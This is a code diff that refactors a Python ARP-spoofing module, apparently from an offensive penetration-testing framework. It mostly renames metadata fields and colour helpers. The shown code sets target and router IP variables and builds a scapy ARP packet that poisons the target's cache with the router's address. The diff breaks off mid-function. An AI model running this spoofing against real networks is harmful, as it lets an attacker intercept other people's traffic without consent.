@@ -1,51 +1,51 @@
 #		Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
 import sys
-from core import bcolors
+from core import colors
 from collections import OrderedDict
 import os
 import subprocess
 from scapy.all import *
 from time import sleep
 
-#info about module
-#modules name (must be same as filename)
-modulename = "arp_spoof"
-#module version
+# Info about the module
+# Module's name (should be same as file's name)
+name = "arp_spoof"
+# Module version
 version = "1.0"
-#description
+# Description
 desc = "arp spoof"
-#creator's github
+# Creator's github
 github = "4shadoww"
-#created by (creators name)
+# Creator's name
 createdby = "4shadoww"
-#email
+# Email
 email = "4shadoww0@gmail.com"
-#alert user if root permissions not available (remove variable below if root permissions needed)
+# Alert user if root permissions not available (remove variable below if root permissions not needed)
 needroot = 1
 
-#list of variables
+# List of the variables
 variables = OrderedDict((
 ('target', '192.168.1.3'),
 ('router', '192.168.1.1'),
 ))
 
-#description for variables
+# Description for variables
 vdesc = [
 'target ip address',
 'router ip address',
 ]
 
-#additional help notes
-help_notes = bcolors.WARNING+"this module will not work without root permission!"+bcolors.END
+# Additional help notes
+help_notes = colors.red+"this module will not work without root permission!"+colors.end
 
 #simple changelog
 changelog = "Version 1.0:\nrelease"
 
 def run():
-	print (bcolors.OKBLUE + "[*]Setting Up ..." + bcolors.END)
-	print(bcolors.OKGREEN + "[OK]" + bcolors.END)
+	print (colors.blue + "[*]Setting Up ..." + colors.end)
+	print(colors.green + "[OK]" + colors.end)
 	sleep(1)
-	print(bcolors.OKBLUE + "[*]ARP Poisoning Has Been Started ..." + bcolors.END)
+	print(colors.blue + "[*]ARP Poisoning Has Been Started ..." + colors.end)
 	packet = ARP()
 	packet.psrc = variables['router']
 	packet.pdst = variables['target']
